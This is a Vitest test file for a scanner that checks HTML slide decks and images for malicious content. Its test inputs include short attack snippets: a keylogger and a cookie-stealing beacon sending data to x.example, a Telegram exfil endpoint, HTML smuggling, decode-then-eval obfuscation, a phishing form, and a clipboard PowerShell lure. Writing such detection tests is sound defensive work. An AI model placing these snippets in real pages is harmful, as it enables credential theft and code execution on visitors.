import { describe, expect, it } from 'vitest';
import {
  decodeHtml,
  normalizeScript,
  scanHtmlFile,
  scanImageFile,
  shrinkBlobs,
  sniffImage,
  sniffMagic,
  virusTotalUrl,
  type ScanReport,
} from '@hps/security-scan';

const enc = (s: string) => new TextEncoder().encode(s);
const scan = (html: string) => scanHtmlFile(enc(html), { fileName: 't.html' });
const ids = (r: ScanReport) => r.findings.map((f) => f.ruleId);
const b64 = (b: Uint8Array | string) =>
  Buffer.from(typeof b === 'string' ? enc(b) : b).toString('base64');

/** Minimal PE header: inert bytes that only look like an executable to a sniffer. */
const fakePe = () => {
  const b = new Uint8Array(512);
  b.set([0x4d, 0x5a]);
  b[60] = 128;
  b.set([0x50, 0x45, 0, 0], 128);
  return b;
};
const EICAR = [
  'X5O!P%@AP[4',
  '\\PZX54(P^)7CC)7}$',
  'EICAR-STANDARD-',
  'ANTIVIRUS-TEST-FILE!$H+H*',
].join('');

describe('benign decks are not called malicious', () => {
  const clean = `<!doctype html><html><head><meta charset="utf-8"><title>발표</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR">
    <style>.slide{width:1920px;height:1080px;background:url(data:image/png;base64,iVBORw0KGgo=)}</style></head>
    <body><section class="slide"><h1>제목</h1><img src="photo.png" alt=""></section></body></html>`;

  it('plain static deck reports nothing above info/low', async () => {
    const r = await scan(clean);
    expect(['none-detected', 'caution']).toContain(r.verdict);
    expect(r.stats.externalDomains).toContain('fonts.googleapis.com');
  });

  it('typical slide navigation script stays below high', async () => {
    const r = await scan(`<body><div class="slide"></div><script>
      let i=0; const s=document.querySelectorAll('.slide');
      document.addEventListener('keydown',e=>{ if(e.key==='ArrowRight'){i++;} s[i]?.classList.add('active'); });
      localStorage.setItem('slide', i);
    </script></body>`);
    expect(r.findings.filter((f) => ['critical', 'high'].includes(f.severity))).toEqual([]);
  });

  it('well-known CDN scripts are not flagged as unknown hosts', async () => {
    const r = await scan(`<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>`);
    expect(ids(r)).not.toContain('script.unknown-host');
    expect(r.stats.externalScripts).toBe(1);
  });

  it('never returns a "safe" verdict', async () => {
    const r = await scan('<p>hi</p>');
    expect(r.verdict).toBe('none-detected');
    expect(JSON.stringify(r)).not.toMatch(/"safe"/);
  });
});

describe('signatures and binary payloads', () => {
  it('detects the EICAR test string in the file', async () => {
    const r = await scan(`<p>${EICAR}</p>`);
    expect(ids(r)).toContain('sig.eicar');
    expect(r.verdict).toBe('malicious');
  });

  it('detects EICAR hidden in a base64 string', async () => {
    const r = await scan(`<script>var x="${b64(EICAR.padEnd(300, ' '))}";</script>`);
    expect(ids(r)).toContain('sig.eicar');
  });

  it('refuses an executable renamed to .html', async () => {
    const r = await scanHtmlFile(fakePe(), { fileName: 'deck.html' });
    expect(ids(r)).toContain('file.pe');
    expect(r.verdict).toBe('malicious');
  });

  it('finds a PE inside a data URL', async () => {
    const r = await scan(`<a href="data:application/octet-stream;base64,${b64(fakePe())}">x</a>`);
    expect(ids(r)).toContain('payload.pe');
  });

  it('finds a PE in a base64 string in script', async () => {
    const r = await scan(`<script>const p="${b64(fakePe())}";</script>`);
    expect(ids(r)).toContain('payload.pe');
  });

  it('finds a PE in an inert JSON block', async () => {
    const r = await scan(`<script type="application/json">{"a":"${b64(fakePe())}"}</script>`);
    expect(ids(r)).toContain('payload.pe');
  });

  it('does not treat "MZ" text as an executable', () => {
    expect(sniffMagic(enc('MZ hello world'))).toBeNull();
  });

  it('flags ZIP disguised as html', async () => {
    const r = await scanHtmlFile(new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0]));
    expect(ids(r)).toContain('file.zip');
  });
});

describe('active-content attacks', () => {
  it('detects HTML smuggling', async () => {
    const r = await scan(`<script>
      const d=atob(payload);const u=new Uint8Array(d.length);
      const b=new Blob([u]);const a=document.createElement('a');
      a.href=URL.createObjectURL(b);a.download='invoice.iso';a.click();
    </script>`);
    expect(ids(r)).toContain('combo.html-smuggling');
    expect(r.verdict).toBe('malicious');
  });

  it('detects packer obfuscation', async () => {
    const r = await scan(
      `<script>eval(function(p,a,c,k,e,d){return p}('x',1,1,'x'.split('|'),0,{}))</script>`,
    );
    expect(ids(r)).toContain('obf.packer');
  });

  it('detects decode-then-eval, also when eval name is escaped', async () => {
    expect(ids(await scan(`<script>eval(atob("YWxlcnQoMSk="))</script>`))).toContain(
      'obf.eval-decode',
    );
    expect(ids(await scan(`<script>window["\\x65val"]("1"); \\u0065val("x")</script>`))).toContain(
      'js.eval',
    );
    expect(ids(await scan(`<script>window['ev'+'al']('1')</script>`))).toContain(
      'obf.indirect-eval',
    );
    expect(ids(await scan(`<script>window["\\x65val"]("1")</script>`))).toContain(
      'obf.indirect-eval',
    );
  });

  it('detects miners', async () => {
    const r = await scan(`<script>var m=new CoinHive.Anonymous('key');m.start()</script>`);
    expect(ids(r)).toContain('miner.signature');
  });

  it('detects ActiveX and shell commands', async () => {
    expect(
      ids(await scan(`<script>new ActiveXObject("WScript.Shell").Run("calc")</script>`)),
    ).toContain('sys.activex');
    expect(
      ids(await scan(`<script>var c="powershell -w hidden -enc SQBFAFgA"</script>`)),
    ).toContain('sys.shell-command');
  });

  it('detects dangerous protocol handlers', async () => {
    expect(ids(await scan(`<a href="ms-msdt:/id PCWDiagnostic">x</a>`))).toContain(
      'sys.protocol-handler',
    );
  });

  it('detects scripts in event handlers and javascript: URLs, with whitespace evasion', async () => {
    const a = await scan(`<img src=x onerror="eval(atob('YQ=='))">`);
    expect(ids(a)).toContain('obf.eval-decode');
    expect(a.stats.eventHandlers).toBe(1);
    const b = await scan(`<a href="java&#10;script:alert(1)">x</a>`);
    expect(ids(b)).toContain('url.javascript');
  });

  it('detects keylogger and data exfiltration combinations', async () => {
    const k = await scan(
      `<script>addEventListener('keydown',e=>fetch('https://x.example/?k='+e.key))</script>`,
    );
    expect(ids(k)).toContain('combo.keylogger');
    const c = await scan(
      `<script>navigator.sendBeacon('https://x.example',document.cookie)</script>`,
    );
    expect(ids(c)).toContain('combo.data-exfil');
  });

  it('detects exfil endpoints', async () => {
    const r = await scan(
      `<script>fetch("https://api.telegram.org/bot123:abc/sendMessage")</script>`,
    );
    expect(ids(r)).toContain('net.exfil-endpoint');
  });

  it('detects phishing forms', async () => {
    const r = await scan(
      `<form action="https://login.example.top/p"><input type="password"></form>`,
    );
    expect(ids(r)).toContain('combo.phishing-form');
    expect(r.verdict).toBe('malicious');
  });

  it('detects ClickFix clipboard lures', async () => {
    const r = await scan(`<script>navigator.clipboard.writeText("powershell -enc AAAA")</script>`);
    expect(ids(r)).toContain('combo.clipboard-shell');
  });

  it('detects scripts in nested data-URL and srcdoc HTML', async () => {
    const inner = `<script>new ActiveXObject("x")</script>`;
    expect(ids(await scan(`<iframe src="data:text/html;base64,${b64(inner)}"></iframe>`))).toEqual(
      expect.arrayContaining(['data.html-frame', 'sys.activex']),
    );
    expect(
      ids(await scan(`<iframe srcdoc="${inner.replace(/"/g, '&quot;')}"></iframe>`)),
    ).toContain('sys.activex');
  });

  it('detects script inside an SVG data URL', async () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script>eval(atob('YQ=='))</script></svg>`;
    expect(ids(await scan(`<img src="data:image/svg+xml;base64,${b64(svg)}">`))).toContain(
      'obf.eval-decode',
    );
  });

  it('bounds recursion on self-nesting payloads', async () => {
    let html = '<p>x</p>';
    for (let i = 0; i < 12; i++)
      html = `<iframe srcdoc="${html.replace(/&/g, '&amp;').replace(/"/g, '&quot;')}"></iframe>`;
    await expect(scan(html)).resolves.toBeDefined();
  });
});

describe('HTML structure attacks', () => {
  it('hidden iframes, base hijack, meta refresh, plugins, downloads', async () => {
    expect(
      ids(await scan(`<iframe src="https://x.example" width="0" height="0"></iframe>`)),
    ).toContain('html.hidden-iframe');
    expect(
      ids(await scan(`<iframe src="https://x.example" style="display:none"></iframe>`)),
    ).toContain('html.hidden-iframe');
    expect(ids(await scan(`<base href="https://x.example/">`))).toContain('html.base-hijack');
    expect(
      ids(await scan(`<meta http-equiv="refresh" content="0;url=https://x.example">`)),
    ).toContain('html.meta-refresh');
    expect(ids(await scan(`<object data="x.swf"></object>`))).toContain('html.plugin-embed');
    expect(ids(await scan(`<a href="x" download="setup.exe">x</a>`))).toContain(
      'html.dangerous-download',
    );
  });

  it('flags NTLM-leaking UNC and file references', async () => {
    expect(ids(await scan(`<img src="\\\\10.0.0.1\\share\\a.png">`))).toContain('url.local-or-smb');
    expect(ids(await scan(`<img src="file:///C:/Windows/win.ini">`))).toContain('url.local-or-smb');
  });

  it('URL reputation signals', async () => {
    const r = await scan(
      `<img src="https://1.2.3.4/a.png"><img src="https://xn--pple-43d.com/a.png"><a href="https://pastebin.com/raw/x">x</a>`,
    );
    expect(ids(r)).toEqual(
      expect.arrayContaining(['url.ip-host', 'url.punycode', 'url.payload-host']),
    );
  });

  it('CSS exfil and legacy CSS code', async () => {
    expect(
      ids(await scan(`<style>input[value^="a"]{background:url(https://x.example/a)}</style>`)),
    ).toContain('css.value-exfil');
    expect(ids(await scan(`<div style="width:expression(alert(1))"></div>`))).toContain('css.code');
  });
});

describe('reporting', () => {
  it('sorts by severity and locates findings by line', async () => {
    const r = await scan(
      `<p>a</p>\n<p>b</p>\n<script>\n\nnew ActiveXObject("x");document.write("y")</script>`,
    );
    expect(r.findings[0]!.severity).toBe('critical');
    expect(r.findings[0]!.line).toBe(5);
  });

  it('aggregates repeats into a count', async () => {
    const r = await scan(`<img src=a onerror="eval(a)"><img src=b onerror="eval(b)">`);
    const eval_ = r.findings.find((f) => f.ruleId === 'js.eval')!;
    expect(eval_.count).toBe(2);
  });

  it('reports a sha256 and a hash-only lookup link', async () => {
    const r = await scan('abc');
    expect(r.sha256).toBe('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
    expect(virusTotalUrl(r.sha256)).toBe(`https://www.virustotal.com/gui/file/${r.sha256}`);
  });

  it('reports exhausted time budget as a limit instead of claiming a full scan', async () => {
    const r = await scanHtmlFile(enc(`<script>eval(1)</script>`.repeat(50)), { timeBudgetMs: -1 });
    expect(r.limits.length).toBeGreaterThan(0);
  });

  // The runner's timeout must exceed the assertion's limit, or a slow CI machine fails on
  // the 5 s default before the 15 s limit below is ever checked.
  it('survives pathological regex input quickly', { timeout: 20_000 }, async () => {
    const t = Date.now();
    await scan(
      `<script>${'_0x1a2b '.repeat(200000)}</script><style>${'url('.repeat(200000)}</style>`,
    );
    expect(Date.now() - t).toBeLessThan(15000);
  });
});

describe('large embedded data', () => {
  const bigPe = (): Uint8Array => {
    const b = new Uint8Array(200 * 1024);
    b.set(fakePe());
    return b;
  };
  it('still finds a PE hidden in a blob the parser skips, in every position', async () => {
    const pe = b64(bigPe());
    expect(ids(await scan(`<script>var p="${pe}"</script>`))).toContain('payload.pe');
    expect(ids(await scan(`<img src="data:image/png;base64,${pe}">`))).toContain('payload.pe');
    expect(ids(await scan(`<script type="application/json">{"a":"${pe}"}</script>`))).toContain(
      'payload.pe',
    );
  });
  it('finds EICAR at the start of a large blob', async () => {
    const bytes = new Uint8Array(200 * 1024);
    bytes.set(enc(EICAR));
    expect(ids(await scan(`<script>var p="${b64(bytes)}"</script>`))).toContain('sig.eicar');
  });
  it('says so when a blob is only partly decoded', async () => {
    const huge = 'A'.repeat(7 * 1024 * 1024);
    expect((await scan(`<img src="data:image/png;base64,${huge}">`)).limits.join()).toContain(
      '앞 4MB',
    );
  });
  it('shrinks and restores exactly, leaving small runs and near-misses alone', () => {
    const run = 'Ab1+/'.repeat(20000);
    const src = `<a href="x">t</a><img src="data:image/png;base64,${run}">${'Q'.repeat(60000)}!`;
    const s = shrinkBlobs(src);
    expect(s.blobs).toEqual([run]);
    expect(s.text.length).toBeLessThan(src.length - 90000);
    expect(s.expand(s.text)).toBe(src);
    expect(shrinkBlobs('<p>small</p>').text).toBe('<p>small</p>');
  });
  it('cannot be confused by a file that contains the token text', () => {
    const run = 'A'.repeat(70000);
    const src = `HPSBLOB_0_ ${run}`;
    const s = shrinkBlobs(src);
    expect(s.expand(s.text)).toBe(src);
  });
  it('stays linear on many near-threshold runs', () => {
    const near = `${'A'.repeat(65000)} `.repeat(200);
    const t = Date.now();
    shrinkBlobs(near);
    expect(Date.now() - t).toBeLessThan(2000);
  });
});

describe('image checks', () => {
  const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0]);
  it('recognises real formats', () => {
    expect(sniffImage(png)).toBe('png');
    expect(sniffImage(enc('<svg xmlns="x"></svg>'))).toBe('svg');
    expect(sniffImage(enc('hello'))).toBeNull();
    expect(
      sniffImage(enc('\n<?xml version="1.0"?>\n<!-- a --> <!-- b -->\n<!DOCTYPE svg x>\n<SVG>')),
    ).toBe('svg');
    expect(sniffImage(enc('<svgfoo>'))).toBeNull();
    expect(sniffImage(enc('<svg'))).toBeNull();
    expect(sniffImage(enc('<!-- never closed <svg>'))).toBeNull();
    expect(sniffImage(enc('<html><svg></svg></html>'))).toBeNull();
  });

  it('cannot be hung by a crafted file', () => {
    // Took 4.8s at 28 repeats with the old regex, about 20 times longer per 4 more. This is 145.
    const attack = enc(`<!--${'--><!--'.repeat(145)}x`);
    const started = performance.now();
    expect(sniffImage(attack)).toBeNull();
    expect(performance.now() - started).toBeLessThan(100);
  });
  it('rejects an executable posing as an image', () => {
    const r = scanImageFile(fakePe(), { declaredMime: 'image/png' });
    expect(r.ok).toBe(false);
  });
  it('accepts a PNG and reports trailing data', () => {
    expect(scanImageFile(png).ok).toBe(true);
    const tail = new Uint8Array(3000);
    const withTail = new Uint8Array([...png, ...enc('IEND'), 0, 0, 0, 0, ...tail]);
    expect(scanImageFile(withTail).findings.map((f) => f.ruleId)).toContain('image.trailing-data');
  });
  it('blocks SVG carrying critical script', () => {
    const r = scanImageFile(enc('<svg xmlns="x"><script>new ActiveXObject("a")</script></svg>'));
    expect(r.ok).toBe(false);
  });
});

describe('decoding', () => {
  it('honours BOMs, meta charset and EUC-KR fallback', () => {
    const eucBytes = new Uint8Array([0xc7, 0xd1, 0xb1, 0xdb]); // 한글
    expect(decodeHtml(eucBytes)).toMatchObject({ text: '한글', encoding: 'euc-kr' });
    const declared = new Uint8Array([...enc('<meta charset="euc-kr">'), ...eucBytes]);
    expect(decodeHtml(declared).text).toContain('한글');
    expect(decodeHtml(new Uint8Array([0xef, 0xbb, 0xbf, 0x41]))).toMatchObject({
      text: 'A',
      hasBom: true,
    });
    expect(decodeHtml(enc('한글'))).toMatchObject({ text: '한글', encoding: 'utf-8' });
  });
  it('scans UTF-16 files instead of skipping them', async () => {
    const u16 = Buffer.from('\ufeff<script>new ActiveXObject("x")</script>', 'utf16le');
    expect(ids(await scanHtmlFile(new Uint8Array(u16)))).toContain('sys.activex');
  });
  it('normalises escapes and concatenation', () => {
    expect(normalizeScript(`"\\x65v"+"al"`)).toBe('"eval"');
  });
});
